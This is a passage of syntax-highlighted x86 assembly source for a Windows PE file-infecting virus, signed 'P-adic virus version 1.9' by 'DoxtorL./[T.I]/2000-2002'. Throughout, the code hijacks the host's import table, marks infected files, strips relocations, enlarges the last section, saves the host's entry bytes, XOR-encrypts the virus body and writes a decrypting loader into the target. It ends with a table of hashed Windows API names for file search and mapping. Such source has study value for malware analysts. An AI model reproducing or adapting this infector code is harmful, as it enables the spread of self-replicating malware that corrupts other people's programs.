</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

</span><span class="sc1">;[save the API name and compute its size]: </span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

</span><span class="sc5">DoAgain</span><span class="sc4">:</span><span class="sc0">                              </span><span class="sc1">;move the api name into ApiHack</span><span class="sc0">

</span><span class="sc6">movsb</span><span class="sc0">                                 

</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">                </span><span class="sc1">;end of string?</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">DoAgain</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> 

</span><span class="sc1">;************************************************************************</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc0">                             </span><span class="sc1">;string + ",0" is 12 char?</span><span class="sc0">
</span><span class="sc6">jl</span><span class="sc0"> </span><span class="sc5">Loop2</span><span class="sc0">                              </span><span class="sc1">;not enough?...go back to Loop2</span><span class="sc0">

</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">GlobalAPI</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc0">                             </span><span class="sc1">;GlobalAlloc string replace</span><span class="sc0">
</span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">                             </span><span class="sc1">;one of api of the host</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                               </span><span class="sc1">;edi =ImageBase of target</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">                           </span><span class="sc1">;address in Import table</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ReturnAdd</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">     </span><span class="sc1">;patchs needed</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">HackAdd</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">       
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc9">Import</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc6">popad</span><span class="sc0">

</span><span class="sc1">;***** End Import table Patching routine</span><span class="sc0">
 
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                      </span><span class="sc1">;restore MapAddress </span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">;save file pointer to code loader</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
 
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Key</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc2">0FEDCBA98h</span><span class="sc0"> </span><span class="sc1">;modify key</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">12h</span><span class="sc4">],</span><span class="sc3">"IT"</span><span class="sc0">     </span><span class="sc1">;mark the infected target</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">+</span><span class="sc2">24h</span><span class="sc4">],</span><span class="sc2">200h</span><span class="sc0"> </span><span class="sc1">;set FileAligment=200h</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">0ch</span><span class="sc4">]</span><span class="sc0">    
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">

         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">+</span><span class="sc2">96</span><span class="sc4">+</span><span class="sc2">40</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0"> 
         </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">NoReloc</span><span class="sc0">

         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc2">800h</span><span class="sc0">
         </span><span class="sc6">jnge</span><span class="sc0"> </span><span class="sc5">NoReloc</span><span class="sc0">

</span><span class="sc1">;[Erase Relocation Section]:</span><span class="sc0">
        
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">+</span><span class="sc2">96</span><span class="sc4">+</span><span class="sc2">40</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">+</span><span class="sc2">96</span><span class="sc4">+</span><span class="sc2">44</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc3">"adP."</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc3">"at"</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">+</span><span class="sc2">1ch</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">LastSectionCode</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0"> 
            </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FileSize</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc5">VirLength</span><span class="sc0">            

        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">SaveFirstBytes</span><span class="sc0">
 
</span><span class="sc5">NoReloc</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;add rounded up last section raw-size</span><span class="sc0">

</span><span class="sc1">;[Compute beginning of code in the last section ,in memory]:</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">0ch</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;last section RVA in memory</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;add last section rounded up size</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">+</span><span class="sc2">1ch</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;add address base of target</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">LastSectionCode</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
        
</span><span class="sc1">;[Update size field in target last section header]:</span><span class="sc0">
        
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc2">800h</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">],</span><span class="sc2">1000h</span><span class="sc0"> 

</span><span class="sc1">;[Update size fields in target optional header]:</span><span class="sc0">

         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">50h</span><span class="sc4">],</span><span class="sc2">1000h</span><span class="sc0">

</span><span class="sc1">;[Save first bytes of host code]:</span><span class="sc0">

</span><span class="sc5">SaveFirstBytes</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                                  </span><span class="sc1">;map pointer to beginning of code</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">LoaderLength</span><span class="sc0">     
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                 </span><span class="sc1">;save size of loader</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                                  
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">SaveHost</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">                     </span><span class="sc1">;save beginning of code in virus body</span><span class="sc0">
</span><span class="sc6">repne</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">edi</span><span class="sc0">

</span><span class="sc1">;[Copy and encrypt code in the last section]:</span><span class="sc0">
        
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,(</span><span class="sc5">EndVir</span><span class="sc4">-</span><span class="sc5">BeginVir</span><span class="sc4">)/</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">BeginVir</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Crypt</span><span class="sc0">

</span><span class="sc1">;[ClearHeap]:</span><span class="sc0">
         
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FileSize</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">MapAddress</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">                            </span><span class="sc1">;ecx=number of useless bytes in</span><span class="sc0">
                                                </span><span class="sc1">;the heap</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">         
 
         </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                            </span><span class="sc1">;set eax to 0</span><span class="sc0">

</span><span class="sc5">Nullify</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">repne</span><span class="sc0"> </span><span class="sc6">stosb</span><span class="sc0">

</span><span class="sc1">;[Copy loader code to target file on disk]:</span><span class="sc0">
     
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">  
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                     </span><span class="sc1">;restore pointer (on disk) to code loader</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">BeginLoader</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">repne</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Counter</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">GetOut</span><span class="sc0">

 </span><span class="sc5">ExitInfectError2</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        

 </span><span class="sc5">ExitInfectError0</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> 

 </span><span class="sc5">ExitInfectError</span><span class="sc4">:</span><span class="sc0">
  
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FileSize</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc5">VirLength</span><span class="sc0"> 
 </span><span class="sc5">GetOut</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc5">CloseFileStuff</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
     
 </span><span class="sc5">ExitOpenFileStuffError</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">stc</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

 </span><span class="sc1">;change a RVA to a file pointer</span><span class="sc0">
 </span><span class="sc1">;In : ebx points to first section </span><span class="sc0">
 </span><span class="sc1">;Out: eax contains the file offset</span><span class="sc0">

 </span><span class="sc5">Rva2Offset</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
  
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SectN</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc5">_Loop</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">jg</span><span class="sc0"> </span><span class="sc5">_Find</span><span class="sc0">

        </span><span class="sc5">NoRawData</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc0">

        </span><span class="sc6">loop</span><span class="sc0">  </span><span class="sc5">_Loop</span><span class="sc0">

 </span><span class="sc5">_Find</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">-</span><span class="sc2">28h</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">-</span><span class="sc2">28h</span><span class="sc4">+</span><span class="sc2">20</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">MapAddress</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        
        </span><span class="sc6">ret</span><span class="sc0">

 </span><span class="sc5">BeginLoader</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">2000h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">15h</span><span class="sc0">          </span><span class="sc1">;call GlobalAlloc</span><span class="sc0">
        </span><span class="sc5">ReturnAdd</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;prepare jump to virus</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">         </span><span class="sc1">;added to modify scan string</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,(</span><span class="sc5">VirLength</span><span class="sc4">)/</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0beh</span><span class="sc0">              </span><span class="sc1">;mov esi,****</span><span class="sc0">
        </span><span class="sc5">LastSectionCode</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

 </span><span class="sc5">Crypt</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lodsd</span><span class="sc0"> 
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">35h</span><span class="sc0">
        </span><span class="sc5">Key</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0abcdef12h</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">Crypt</span><span class="sc0"> 
        </span><span class="sc6">ret</span><span class="sc0">                  </span><span class="sc1">;go to beginning of code</span><span class="sc0">

 </span><span class="sc5">EndLoader</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc5">SaveHost</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0ebh</span><span class="sc4">,</span><span class="sc2">4ch</span><span class="sc0"> 
                 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">35</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">90h</span><span class="sc4">)</span><span class="sc0">
  

</span><span class="sc5">Constants</span><span class="sc4">:</span><span class="sc0">
         
        </span><span class="sc5">B</span><span class="sc0">                        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">134217729</span><span class="sc0">
        </span><span class="sc5">A</span><span class="sc0">                        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">44739244</span><span class="sc0">
        </span><span class="sc10">C</span><span class="sc0">                        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">134217727</span><span class="sc0">
        </span><span class="sc5">ApiNb</span><span class="sc0">                    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">21</span><span class="sc0">
        </span><span class="sc5">MaxPath</span><span class="sc0">                  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0">
        </span><span class="sc5">Miliseconds</span><span class="sc0">              </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">5000</span><span class="sc0">
        </span><span class="sc5">HowMany</span><span class="sc0">                  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc5">VirLength</span><span class="sc0">                </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">800h</span><span class="sc0">
        </span><span class="sc5">VirLength0</span><span class="sc0">               </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">EndVir0</span><span class="sc4">-</span><span class="sc5">BeginVir</span><span class="sc0">
        </span><span class="sc5">LoaderLength</span><span class="sc0">             </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">EndLoader</span><span class="sc4">-</span><span class="sc5">BeginLoader</span><span class="sc0">

        </span><span class="sc5">Sign</span><span class="sc0">                     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"P-adic virus version 1.9"</span><span class="sc0"> 
                                 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"DoxtorL./[T.I]/2000-2002"</span><span class="sc0">

        </span><span class="sc5">FindMatch</span><span class="sc0">                </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"goat*.exe"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">FindMatch2</span><span class="sc0">               </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"*.*"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">DotDot</span><span class="sc0">                   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">".."</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">GlobalAPI</span><span class="sc0">                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GlobalAlloc"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">ApiHack</span><span class="sc0">                  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GlobalAlloc"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">  </span><span class="sc1">;only for the</span><span class="sc0">
                                                     </span><span class="sc1">;1st generation</span><span class="sc0">
                                 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">25</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">       </span><span class="sc1">;reserved for char</span><span class="sc0">
                                                     </span><span class="sc1">;of api name found</span><span class="sc0">


 </span><span class="sc5">ApiList</span><span class="sc0">                         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0fdbe9ddfh</span><span class="sc0">  </span><span class="sc1">;CloseHandle</span><span class="sc0">
                                 </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">04b00fba1h</span><span class="sc0">  </span><span class="sc1">;CreateFileA</span><span class="sc0">
                                 </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00d6ea22eh</span><span class="sc0">  </span><span class="sc1">;CreateFileMappingA</span><span class="sc0">
                                 </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0be307c51h</span><span class="sc0">  </span><span class="sc1">;CreateThread</span><span class="sc0">
                                 </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0be7b8631h</span><span class="sc0">  </span><span class="sc1">;FindClose</span><span class="sc0">
                                 </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0c915738fh</span><span class="sc0">  </span><span class="sc1">;FindFirstFileA</span><span class="sc0">
                                 </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">08851f43dh</span><span class="sc0">  </span><span class="sc1">;FindNextFileA</span><span class="sc0">
                                 </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">028f8c6fbh</span><span class="sc0">  </span><span class="sc1">;GetCurrentDirectoryA</span><span class="sc0">
                                 </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00029ecfbh</span><span class="sc0">  </span><span class="sc1">;GetCurrentProcessId </span><span class="sc0">
                                 </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">09c3a5210h</span><span class="sc0">  </span><span class="sc1">;GetDriveTypeA</span><span class="sc0">
                                 </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">040bf2f84h</span><span class="sc0">  </span><span class="sc1">;GetProcAddress</span><span class="sc0">
                                 </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">032beddc3h</span><span class="sc0">  </span><span class="sc1">;MapViewOfFile</span><span class="sc0">
                                 </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0c329f65bh</span><span class="sc0">  </span><span class="sc1">;OpenProcess  </span><span class="sc0">
                                 </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">08e0e5487h</span><span class="sc0">  </span><span class="sc1">;SetCurrentDirectoryA</span><span class="sc0">
                                 </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0bc738ae6h</span><span class="sc0">  </span><span class="sc1">;SetEndOfFile</span><span class="sc0">
                                 </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">050665047h</span><span class="sc0">  </span><span class="sc1">;SetFileAttributesA </span><span class="sc0">
